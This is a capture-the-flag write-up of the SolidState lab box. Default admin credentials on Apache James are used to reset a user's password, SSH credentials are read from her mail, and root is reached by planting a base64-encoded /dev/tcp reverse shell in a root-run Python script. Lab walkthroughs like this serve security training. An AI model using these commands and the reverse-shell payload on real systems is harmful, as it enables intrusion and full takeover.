We found Apache James 2.3.2 in the port 4555, we tried the default credentials and it works

```bash
┌──(kali㉿kali)-[~]
└─$ telnet 10.10.10.51 4555
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
HELP
Currently implemented commands:

help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit                                    close connection

listusers
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
Connection closed by foreign host
```

We change the user mindy password and dig into pop3 service looking for emails we found a password for SSH

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/SolidState-10.10.10.51]
└─$ telnet 10.10.10.51 4555
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands

setpassword mindy password123

-------------

┌──(kali㉿kali)-[~]
└─$ telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER mindy
+OK
PASS password123
+OK Welcome mindy
LIST
+OK 2 1945
1 1109
2 836
.
RETR 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
From: mailadmin@localhost
Subject: Welcome

Dear Mindy,
Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.

We are looking forward to you joining our team and your success at Solid State Security. 

Respectfully,
James
.
RETR 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James
```

Now if establish a ssh connection with mindy we get a restricted bash, but we can spawn bash using the `-t` flag (`-t bash`). Now for privilege escalation, we found nothing after enumerate the system so lets run pspy (32, 64 didn't work)

```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ ./pspy32
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

[...SNIP...]

CMD: UID=0     PID=22786  | python /opt/tmp.py
```

We found this script and it seems that is made to delete the tmp folder after some time

```bash
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()
```

Changing the command in the script will give us a shell. Writing a reverse shell `/bin/bash -i >& /dev/tcp/10.10.14.13/9001 0>&1` didn't work, so we had to encode the shell

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/SolidState-10.10.10.51]
└─$ echo '/bin/bash -i >& /dev/tcp/10.10.14.13/1236 0>&1'|base64 
L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjEzLzEyMzYgMD4mMQo=

------------

${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ cat /opt/tmp.py 
#!/usr/bin/env python
import os
import sys
try:
     os.system('echo "L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjEzLzEyMzYgMD4mMQo="|base64 -d|bash')
except:
     sys.exit()

------------

┌──(kali㉿kali)-[~]
└─$ nc -nvlp 1236
listening on [any] 1236 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.10.51] 39238
bash: cannot set terminal process group (23480): Inappropriate ioctl for device
bash: no job control in this shell
root@solidstate:~# whoami
root
```

And we are root
